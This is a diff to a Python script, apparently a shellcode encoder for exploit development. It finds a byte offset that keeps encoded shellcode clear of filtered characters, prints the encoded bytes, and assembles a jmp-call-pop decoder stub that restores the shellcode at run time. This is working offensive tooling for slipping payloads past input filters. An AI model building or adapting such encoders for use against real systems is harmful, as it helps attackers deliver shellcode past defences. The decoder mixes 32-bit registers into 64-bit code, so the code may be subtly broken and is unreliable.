@@ -13,7 +13,18 @@ if len(sys.argv) != 2:
 shellcode = sys.argv[1]
 shellcode_len = len(shellcode)
 
-def	print_decoder(shellcode):
+def	get_offset(shellcode, offset = 1):
+	for s in shellcode:
+		for c in filters:
+			x = ord(s) + offset
+			if x == c:
+				return get_offset(shellcode, offset + 1)
+	return offset
+
+def	print_encoded(shellcode, offset):
+	print(''.join([r'\x{:x}'.format(ord(c) + offset) for c in shellcode]))
+
+def	print_decoder(shellcode, offset):
 	f = open("decoder.asm", "w")
 	f.write("""BITS 64
 jmp short foo
@@ -22,20 +33,20 @@ bar:
 	xor rcx, rcx
 	mov rcx, {}
 decoder:
-	sub byte [esi + ecx - 1], 0
+	sub byte [esi + ecx - 1], {}
 	sub rcx, 1
 	jnz decoder
 	jmp short shellcode
 foo:
 	call bar
 shellcode:
-	""".format(shellcode_len))
+	""".format(shellcode_len, offset))
 	f.close()
 	os.system("nasm decoder.asm")
 	result = subprocess.Popen(['xxd -ps decoder'], shell=True, stdout=subprocess.PIPE).communicate()[0]
 	result = result.decode("utf-8").replace("\n", "")
-	print(result)
-#def	print_shellcode(shellcode):
+	sys.stdout.write(result)
 
-print_decoder(shellcode)
-#print_shellcode(shellcode)
+offset = get_offset(shellcode)
+print_decoder(shellcode, offset)
+print_encoded(shellcode, offset)
